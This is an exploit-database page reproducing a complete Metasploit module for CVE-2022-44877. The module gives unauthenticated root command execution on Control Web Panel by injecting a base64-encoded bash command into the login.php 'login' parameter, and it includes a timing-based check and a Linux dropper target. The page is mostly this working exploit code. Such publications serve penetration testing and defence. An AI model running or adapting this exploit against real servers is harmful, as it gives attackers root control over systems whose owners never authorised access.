---
title: Control Web Panel Unauthenticated Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2023020009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-03
fetch_date: 2025-10-04T05:33:05.561389
---

# Control Web Panel Unauthenticated Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Control Web Panel Unauthenticated Remote Command Execution** **2023.02.02**  Credit:  **[Spencer McIntyre](https://cxsecurity.com/author/Spencer%2BMcIntyre/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-44877](https://cxsecurity.com/cveshow/CVE-2022-44877/ "Click to see CVE-2022-44877")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/stopwatch'
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'CWP login.php Unauthenticated RCE',
'Description' => %q{
Control Web Panel versions < 0.9.8.1147 are vulnerable to
unauthenticated OS command injection. Successful exploitation results
in code execution as the root user. The results of the command are not
contained within the HTTP response and the request will block while
the command is running.
},
'Author' => [
'Spencer McIntyre', # metasploit module
'Numan Türle' # vulnerability discovery
],
'References' => [
[ 'CVE', '2022-44877' ],
[ 'URL', 'https://github.com/numanturle/CVE-2022-44877' ],
[ 'URL', 'https://control-webpanel.com/changelog#1674073133745-84af1b53-c121' ]
],
'DisclosureDate' => '2023-01-05',
'License' => MSF\_LICENSE,
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH\_CMD, ARCH\_X86, ARCH\_X64],
'Privileged' => true,
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :linux\_dropper
}
]
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'SSL' => true
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
register\_options([
Opt::RPORT(2031),
OptString.new('TARGETURI', [true, 'Base path', '/login/index.php'])
])
end
def check
sleep\_time = rand(5..10)
\_, elapsed\_time = Rex::Stopwatch.elapsed\_time do
execute\_command("sleep #{sleep\_time}")
end
vprint\_status("Elapsed time: #{elapsed\_time} seconds")
unless elapsed\_time > sleep\_time
return CheckCode::Safe('Failed to test command injection.')
end
CheckCode::Appears('Successfully tested command injection.')
rescue Msf::Exploit::Failed
return CheckCode::Safe('Failed to test command injection.')
end
def exploit
print\_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
case target['Type']
when :unix\_cmd
if execute\_command(payload.encoded)
print\_good("Successfully executed command: #{payload.encoded}")
end
when :linux\_dropper
execute\_cmdstager
end
end
def execute\_command(cmd, \_opts = {})
vprint\_status("Executing command: #{cmd}")
res = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path) + "?login=$(echo${IFS}#{Rex::Text.encode\_base64(cmd)}|base64${IFS}-d|bash)",
'vars\_post' => {
'username' => 'root', # \*must\* be root
'password' => rand\_text\_alphanumeric(4..16),
'commit' => 'Login'
}
)
# the command will either cause the response to timeout or return a 302
return if res.nil?
return if res.code == 302 && res.headers['Location'].include?('login=failed')
fail\_with(Failure::UnexpectedReply, "The HTTP server replied with a status of #{res.code}")
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020009)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top